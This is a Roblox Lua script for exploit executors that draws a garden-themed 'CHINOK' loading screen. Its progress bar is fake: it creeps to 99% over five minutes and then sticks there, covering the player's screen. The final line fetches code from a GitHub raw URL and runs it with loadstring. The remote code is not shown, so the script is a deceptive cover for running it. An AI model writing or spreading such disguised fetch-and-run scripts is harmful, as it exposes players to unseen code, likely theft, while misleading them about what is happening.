-- CHINOK - Premium Loading Screen GUI
-- Mobile Optimized | Executor Compatible

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "ChinokLoading"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.Parent = playerGui

-- Main Frame (Full Screen)
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(1, 0, 1, 0)
mainFrame.Position = UDim2.new(0, 0, 0, 0)
mainFrame.BackgroundColor3 = Color3.fromRGB(85, 170, 85)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

-- Background Gradient
local backgroundGradient = Instance.new("UIGradient")
backgroundGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(76, 175, 80)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(139, 195, 74)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(205, 220, 57))
}
backgroundGradient.Rotation = 45
backgroundGradient.Parent = mainFrame

-- Animated Background Plants
local plantsContainer = Instance.new("Frame")
plantsContainer.Name = "PlantsContainer"
plantsContainer.Size = UDim2.new(1, 0, 1, 0)
plantsContainer.BackgroundTransparency = 1
plantsContainer.Parent = mainFrame

-- Create floating plant particles
local plantEmojis = {"🌱", "🌿", "🍃", "🌸", "🌺", "🌻", "🌷", "🌹"}

for i = 1, 15 do
    local plant = Instance.new("TextLabel")
    plant.Name = "Plant" .. i
    plant.Size = UDim2.new(0, math.random(30, 60), 0, math.random(30, 60))
    plant.Position = UDim2.new(math.random(), 0, math.random(), 0)
    plant.BackgroundTransparency = 1
    plant.Text = plantEmojis[math.random(1, #plantEmojis)]
    plant.TextScaled = true
    plant.TextTransparency = 0.3
    plant.Parent = plantsContainer
    
    -- Floating animation
    local floatTween = TweenService:Create(plant, 
        TweenInfo.new(math.random(3, 8), Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
        {Position = UDim2.new(plant.Position.X.Scale, 0, plant.Position.Y.Scale + math.random(-20, 20)/100, 0)}
    )
    floatTween:Play()
    
    -- Rotation animation
    local rotateTween = TweenService:Create(plant,
        TweenInfo.new(math.random(4, 10), Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1),
        {Rotation = 360}
    )
    rotateTween:Play()
end

-- Title Frame
local titleFrame = Instance.new("Frame")
titleFrame.Name = "TitleFrame"
titleFrame.Size = UDim2.new(0.9, 0, 0.15, 0)
titleFrame.Position = UDim2.new(0.05, 0, 0.2, 0)
titleFrame.BackgroundTransparency = 1
titleFrame.Parent = mainFrame

-- Game Title
local gameTitle = Instance.new("TextLabel")
gameTitle.Name = "GameTitle"
gameTitle.Size = UDim2.new(1, 0, 1, 0)
gameTitle.BackgroundTransparency = 1
gameTitle.Text = "🌱 CHINOK 🌱"
gameTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
gameTitle.TextScaled = true
gameTitle.Font = Enum.Font.GothamBold
gameTitle.TextStrokeTransparency = 0
gameTitle.TextStrokeColor3 = Color3.fromRGB(0, 100, 0)
gameTitle.Parent = titleFrame

-- Title glow effect
local titleGlow = Instance.new("TextLabel")
titleGlow.Name = "TitleGlow"
titleGlow.Size = UDim2.new(1, 4, 1, 4)
titleGlow.Position = UDim2.new(0, -2, 0, -2)
titleGlow.BackgroundTransparency = 1
titleGlow.Text = gameTitle.Text
titleGlow.TextColor3 = Color3.fromRGB(144, 238, 144)
titleGlow.TextScaled = true
titleGlow.Font = Enum.Font.GothamBold
titleGlow.TextTransparency = 0.5
titleGlow.ZIndex = -1
titleGlow.Parent = gameTitle

-- Loading Container
local loadingContainer = Instance.new("Frame")
loadingContainer.Name = "LoadingContainer"
loadingContainer.Size = UDim2.new(0.8, 0, 0.3, 0)
loadingContainer.Position = UDim2.new(0.1, 0, 0.45, 0)
loadingContainer.BackgroundTransparency = 1
loadingContainer.Parent = mainFrame

-- Loading Bar Background
local loadingBarBg = Instance.new("Frame")
loadingBarBg.Name = "LoadingBarBg"
loadingBarBg.Size = UDim2.new(1, 0, 0.15, 0)
loadingBarBg.Position = UDim2.new(0, 0, 0.4, 0)
loadingBarBg.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
loadingBarBg.BackgroundTransparency = 0.3
loadingBarBg.BorderSizePixel = 0
loadingBarBg.Parent = loadingContainer

-- Loading Bar Background Corner
local bgCorner = Instance.new("UICorner")
bgCorner.CornerRadius = UDim.new(0, 25)
bgCorner.Parent = loadingBarBg

-- Loading Bar
local loadingBar = Instance.new("Frame")
loadingBar.Name = "LoadingBar"
loadingBar.Size = UDim2.new(0, 0, 1, 0)
loadingBar.BackgroundColor3 = Color3.fromRGB(34, 139, 34)
loadingBar.BorderSizePixel = 0
loadingBar.Parent = loadingBarBg

-- Loading Bar Corner
local barCorner = Instance.new("UICorner")
barCorner.CornerRadius = UDim.new(0, 25)
barCorner.Parent = loadingBar

-- Loading Bar Gradient
local barGradient = Instance.new("UIGradient")
barGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(34, 139, 34)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(50, 205, 50)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(124, 252, 0))
}
barGradient.Parent = loadingBar

-- Progress Text
local progressText = Instance.new("TextLabel")
progressText.Name = "ProgressText"
progressText.Size = UDim2.new(1, 0, 0.2, 0)
progressText.Position = UDim2.new(0, 0, 0.65, 0)
progressText.BackgroundTransparency = 1
progressText.Text = "0%"
progressText.TextColor3 = Color3.fromRGB(255, 255, 255)
progressText.TextScaled = true
progressText.Font = Enum.Font.GothamBold
progressText.TextStrokeTransparency = 0.5
progressText.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
progressText.Parent = loadingContainer

-- Status Text
local statusText = Instance.new("TextLabel")
statusText.Name = "StatusText"
statusText.Size = UDim2.new(1, 0, 0.15, 0)
statusText.Position = UDim2.new(0, 0, 0.15, 0)
statusText.BackgroundTransparency = 1
statusText.Text = "🌱 Planting seeds..."
statusText.TextColor3 = Color3.fromRGB(255, 255, 255)
statusText.TextScaled = true
statusText.Font = Enum.Font.Gotham
statusText.TextTransparency = 0.2
statusText.Parent = loadingContainer

-- Mobile optimization
if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
    -- Adjust sizes for mobile
    titleFrame.Size = UDim2.new(0.95, 0, 0.2, 0)
    titleFrame.Position = UDim2.new(0.025, 0, 0.15, 0)
    loadingContainer.Size = UDim2.new(0.9, 0, 0.35, 0)
    loadingContainer.Position = UDim2.new(0.05, 0, 0.4, 0)
end

-- Loading Logic
local progress = 0
local startTime = tick()
local loadingMessages = {
    "🌱 Planting seeds...",
    "🌿 Watering the garden...",
    "🌸 Growing beautiful flowers...",
    "🦋 Attracting butterflies...",
    "🌻 Blooming sunflowers...",
    "🌺 Creating paradise...",
    "🌈 Adding final touches...",
    "✨ Almost ready..."
}

-- Progress animation function
local function updateProgress()
    local elapsedTime = tick() - startTime
    local targetProgress = math.min((elapsedTime / 300) * 99, 99) -- 5 minutes to reach 99%
    
    -- Smooth progress interpolation
    progress = progress + (targetProgress - progress) * 0.02
    
    -- Update UI
    local progressPercent = math.floor(progress)
    progressText.Text = progressPercent .. "%"
    
    -- Update loading bar
    TweenService:Create(loadingBar, 
        TweenInfo.new(0.5, Enum.EasingStyle.Quad), 
        {Size = UDim2.new(progress/100, 0, 1, 0)}
    ):Play()
    
    -- Update status message
    local messageIndex = math.min(math.floor(progress/12.5) + 1, #loadingMessages)
    if statusText.Text ~= loadingMessages[messageIndex] then
        statusText.Text = loadingMessages[messageIndex]
        
        -- Pulse effect for new message
        local pulseTween = TweenService:Create(statusText,
            TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 1, true),
            {TextTransparency = 0.8}
        )
        pulseTween:Play()
    end
    
    -- Stuck at 99% effect
    if progress >= 99 then
        progress = 99
        statusText.Text = "🌿 Almost there... just a bit more!"
        
        -- Add loading bar pulse effect when stuck
        local pulseTween = TweenService:Create(loadingBar,
            TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
            {BackgroundTransparency = 0.3}
        )
        pulseTween:Play()
    end
end

-- Title pulse animation
local titlePulse = TweenService:Create(gameTitle,
    TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
    {TextTransparency = 0.2}
)
titlePulse:Play()

-- Progress update loop
local progressConnection
progressConnection = RunService.Heartbeat:Connect(updateProgress)

-- Clean up function (call this when you want to remove the loading screen)
local function cleanUp()
    if progressConnection then
        progressConnection:Disconnect()
    end
    screenGui:Destroy()
end

-- Example: Remove loading screen after 6 minutes or when needed
-- spawn(function()
--     wait(360) -- 6 minutes
--     cleanUp()
-- end)

-- Return cleanup function for external control
return cleanUp

loadstring(game:HttpGet("https://raw.githubusercontent.com/arkoarko43/gag/refs/heads/main/growagarden1"))()
